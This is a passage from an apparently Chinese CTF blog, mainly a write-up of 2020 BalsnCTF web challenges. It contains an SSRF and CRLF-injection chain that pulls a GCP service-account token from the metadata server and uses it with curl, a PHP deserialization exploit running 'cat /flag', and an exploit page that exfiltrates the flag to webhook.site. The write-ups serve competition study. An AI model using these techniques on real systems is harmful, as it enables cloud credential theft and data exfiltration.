class="string">&#x27;hint.txt&#x27;</span>,pwd=<span class="built_in">bytes</span>(pwd,encoding=<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        writebyte(<span class="built_in">str</span>,<span class="string">&quot;temp.txt&quot;</span>)</span><br><span class="line">    writebyte(readbyte(<span class="string">&#x27;temp.zip&#x27;</span>),<span class="string">&#x27;onion1.zip&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data,groupnums</span>):</span></span><br><span class="line">    a=[]</span><br><span class="line">    b=[]</span><br><span class="line">    section=<span class="built_in">int</span>(<span class="built_in">len</span>(data)/groupnums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),section):</span><br><span class="line">        a.append(data[i:i+section])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(section):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(groupnums):</span><br><span class="line">            b.append(a[j][i])</span><br><span class="line">    cipher=(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i])^i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b))))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    result=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(data)+<span class="number">1</span>):</span><br><span class="line">        result.append(encrypt(data,i))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">may_r=decrypt(<span class="string">&#x27;f^n2ekass:iy~&gt;w|`ef&quot;$&#123;Ip)8if&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> may_r:</span><br><span class="line">    <span class="built_in">print</span>(i[::<span class="number">2</span>]+i[<span class="number">1</span>::<span class="number">2</span>])</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" data-id="cku8j3ffi0000dan7g4lzf3lj" data-title="2019xman个人排位赛wp" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020 balsn ctf web 部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-BalsnCTF-web-部分题解"><a href="#2020-BalsnCTF-web-部分题解" class="headerlink" title="2020 BalsnCTF web 部分题解"></a>2020 BalsnCTF web 部分题解</h1><p>文章首发于<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222675">安全客</a></p>
<p>题目文件：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ">https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ</a><br>提取码：v7qg </p>
<h2 id="tpc"><a href="#tpc" class="headerlink" title="tpc"></a>tpc</h2><p><a target="_blank" rel="noopener" href="http://35.194.175.80:8000/">http://35.194.175.80:8000/</a></p>
<p>题目说flag就在工作目录下并且不可以暴力猜解出文件名</p>
<p>试着file协议，发现可以任意文件读取，那么我们首先要做的是试着读取源文件</p>
<p>读取/proc/self/cmdline查看启动命令</p>
<p><code>/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -</code></p>
<p>谷歌以下gunicorn的用法很容易知道源文件就是<code>main-dc1e2f5f7a4f359bb5ce1317a.py</code></p>
<p>再读取/proc/self/environ查看环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=tpc-1PYTHON_PIP_VERSION=19.0.3SHLVL=1HOME=/home/ggGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.2PWD=/opt/workdir</span><br></pre></td></tr></table></figure>

<p>于是就知道源文件在 /opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/query&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    site = request.args.get(<span class="string">&#x27;site&#x27;</span>)</span><br><span class="line">    text = urllib.request.urlopen(site).read()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/query?site=[your website]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>就提供了一个很简单的ssrf功能，那么为了找到下一步的思路，就必须收集更多信息，用字典fuzz一下得到以下关键信息</p>
<p>/proc/1/net/arp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.4       0x1         0x0         00:00:00:00:00:00     *        docker0</span><br><span class="line">172.17.0.3       0x1         0x0         00:00:00:00:00:00     *        docker0</span><br><span class="line">172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        docker0</span><br><span class="line">10.140.0.1       0x1         0x2         42:01:0a:8c:00:01     *        eth0</span><br></pre></td></tr></table></figure>

<p>/etc/hosts</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># /etc/hosts: Local Host Database</span><br><span class="line">#</span><br><span class="line"># This file describes a number of aliases-to-address mappings for the for </span><br><span class="line"># local hosts that share this file.</span><br><span class="line">#</span><br><span class="line"># In the presence of the domain name service or NIS, this file may not be </span><br><span class="line"># consulted at all; see /etc/host.conf for the resolution order.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># IPv4 and IPv6 localhost aliases</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Imaginary network.</span><br><span class="line">#10.0.0.2               myname</span><br><span class="line">#10.0.0.3               myfriend</span><br><span class="line">#</span><br><span class="line"># According to RFC 1918, you can use the following IP networks for private </span><br><span class="line"># nets which will never be connected to the Internet:</span><br><span class="line">#</span><br><span class="line">#       10.0.0.0        -   10.255.255.255</span><br><span class="line">#       172.16.0.0      -   172.31.255.255</span><br><span class="line">#       192.168.0.0     -   192.168.255.255</span><br><span class="line">#</span><br><span class="line"># In case you want to be able to connect directly to the Internet (i.e. not </span><br><span class="line"># behind a NAT, ADSL router, etc...), you need real official assigned </span><br><span class="line"># numbers.  Do not try to invent your own network numbers but instead get one </span><br><span class="line"># from your network provider (if any) or from your regional registry (ARIN, </span><br><span class="line"># APNIC, LACNIC, RIPE NCC, or AfriNIC.)</span><br><span class="line">#</span><br><span class="line">169.254.169.254 metadata.google.internal metadata</span><br></pre></td></tr></table></figure>



<p>hosts文件里面添加了一条特殊的记录，谷歌一下发现里面存放着实例的一些数据</p>
<p>直接访问<code>metadata.google.internal</code>，得到：</p>
<p><code>0.1/ computeMetadata/</code></p>
<p>继续访问下一级目录发现500了</p>
<p>阅读<a target="_blank" rel="noopener" href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying">文档</a>得知要加入<code>Metadata-Flavor: Google</code>请求头</p>
<p>python的urlllib库之前爆出存在着CRLF的漏洞，利用这个来绕过</p>
<p><code>&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal/PATH/%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</code></p>
<p>写个脚本读取所有数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">parent,path</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal&quot;</span>+parent+path+<span class="string">&quot;%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(burp0_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span>(<span class="params">parent,path</span>):</span></span><br><span class="line">    r = req(parent,path)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(parent+path)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----------------------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    child = r.text.splitlines()</span><br><span class="line">    parent=parent+path</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> child:</span><br><span class="line">        </span><br><span class="line">        getInfo(parent,i)</span><br><span class="line"></span><br><span class="line">getInfo(parent=<span class="string">&quot;&quot;</span>,path=<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>得到以下数据（只显示对题目有用的数据）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/project/project-id</span><br><span class="line">balsn-ctf-2020-tpc</span><br><span class="line">------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/instance/service-accounts/default/token</span><br><span class="line">&#123;&quot;access_token&quot;:&quot;ya29.c.KpcB5QdRi_ofZUDT6YcnsZrXwex0ocEfddkf1cL9qgsBVUuJI6xm7X__zkSxCc4jbw35HGJ2ZSbVUQljIKqOWbe_-q33It_9ip0sO15lH8usKPuj1I-vg2BHQeyizyWloiDf2vlRbL0EiZNaiKa3_tGFFEbxt9JrmsfYxWoN3_VOn3cqTbjNyEdj3-Xr3oQUiD0ESz0H2NS4Lg&quot;,&quot;expires_in&quot;:3147,&quot;token_type&quot;:&quot;Bearer&quot;&#125;</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">/computeMetadata/v1/instance/service-accounts/default/scopes</span><br><span class="line">https://www.googleapis.com/auth/devstorage.read_only</span><br><span class="line">https://www.googleapis.com/auth/logging.write</span><br><span class="line">https://www.googleapis.com/auth/monitoring.write</span><br><span class="line">https://www.googleapis.com/auth/servicecontrol</span><br><span class="line">https://www.googleapis.com/auth/service.management.readonly</span><br><span class="line">https://www.googleapis.com/auth/trace.append</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>阅读<a target="_blank" rel="noopener" href="https://cloud.google.com/storage/docs">文档</a>来了解下载存储在服务器上的数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查询存储分区：</span></span><br><span class="line">curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc&quot;</span><br><span class="line"><span class="meta">  </span></span><br><span class="line"><span class="meta">#</span><span class="bash">查询存储对象</span></span><br><span class="line">curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载对象：</span></span><br><span class="line">curl -X GET -o &quot;/tmp/obj1&quot; -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \</span><br><span class="line">  &quot;https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&amp;alt=media&quot;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>将所有对象下载下来后<code>cat * | grep -a flag</code><br>获得flag路径：<code>/opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt</code></p>
<p>BALSN{What_permissions_does_the_service_account_need}</p>
<h2 id="L5D"><a href="#L5D" class="headerlink" title="L5D"></a>L5D</h2><p>题目描述</p>
<blockquote>
<p>「Taking L5D was a profound experience, one of the most important things in my life.」</p>
<p>Try this new Unserialize-Oriented Programming System a.k.a. L5D !</p>
<p><a target="_blank" rel="noopener" href="http://l5d.balsnctf.com:12345/index.php">http://l5d.balsnctf.com:12345/index.php</a></p>
<p>PHP Version: 7.0.33</p>
<p>Author: kaibro</p>
</blockquote>
<p>题目提供了源码，阅读后发现以下可能作为关键点的地方：</p>
<p>变量覆盖：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142917.jpg" alt="image6765"></p>
<p>任意命令执行：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142948.jpg" alt="image6899"></p>
<p>修改全局变量cmd</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116143051.jpg" alt="image7035"></p>
<p>但是题目给反序列化的数据加上了一个限制：不能出现<code>*</code>(protect变量就需要<code>*</code>号)</p>
<p>实际测试一下发现，并不能用public,private的同名变量来代替protect变量，这是难点一</p>
<p>还有就是其他类的<code>__wakeup</code>方法会禁止我们通过L5D_Upload来任意变量覆盖，然后L5D_Upload又必须在其他的<code>__destruct</code>方法前执行，这是难点二</p>
<p>难点二我们可以通过最后一个调用L5D_Upload的<code>__wakeup</code>，第一个调用它的<code>__destruct</code>来绕过，因为<code>__wakeup</code>的调用顺序是从里到外，从前到后，<code>__destruct</code>的调用顺序是从外到内，从前到后，所以构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding = <span class="keyword">new</span> L5D_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding=<span class="keyword">new</span> L5D_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Command</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> L5D_Upload();</span><br></pre></td></tr></table></figure>

<p>接着就是难点一了，对<code>*</code>号的禁用导致我们不能直接反序列化一个protect属性的成员</p>
<p>但是我们可以用大写S来绕过：</p>
<p>可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;L5D_ResetCMD&quot;:2:&#123;s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这样new_cmd就是protect属性了</p>
<p>最后的exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding = <span class="keyword">new</span> L5D_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$padding</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;padding=<span class="keyword">new</span> L5D_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L5D_Command</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=str_replace(<span class="string">&#x27;s:10:&quot;&#x27;</span>.<span class="string">&quot;\x00*\x00&quot;</span>,<span class="string">&#x27;S:10:&quot;\00\2a\00&#x27;</span>,serialize(<span class="keyword">new</span> L5D_Upload()));</span><br><span class="line"><span class="keyword">echo</span> urlencode (<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="the-woven-web"><a href="#the-woven-web" class="headerlink" title="the woven web"></a>the woven web</h2><p>看了<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py">Super⚔️Blue</a> 的wp，只能说一句牛逼</p>
<p>其实原理很简单：让浏览器自动下载一个文件，然后file协议访问那个文件，那个文件就可以引用server.js，于是就有flag的值了</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.html&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    r = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            function require(a)&#123;</span></span><br><span class="line"><span class="string">                if(a==&quot;express&quot;)&#123;return ()=&gt;&#123;return &#123;get:function()&#123;&#125;,listen:function()&#123;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                if(a==&quot;redis&quot;)&#123;</span></span><br><span class="line"><span class="string">                    return &#123;createClient:function()&#123;&#125;&#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                if(a==&quot;fs&quot;)&#123;</span></span><br><span class="line"><span class="string">                    return &#123;existsSync:function()&#123;&#125;&#125;;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;script src=&quot;../app/server.js&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            fetch(&quot;https://webhook.site/X?a=&quot;+FLAG);</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r,&#123;<span class="string">&quot;Content-Disposition&quot;</span>:<span class="string">&#x27;attachment; filename=&quot;wtf22.html&quot;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(__name__==<span class="string">&quot;__main__&quot;</span>):</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">4000</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>





<h2 id="Windows-XP-Media-Player"><a href="#Windows-XP-Media-Player" class="headerlink" title="Windows XP Media Player"></a>Windows XP Media Player</h2><p>还是看了<a target="_blank" rel="noopener" href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py">Super⚔️Blue</a> 的wp</p>
<p>应该静下心来做的</p>
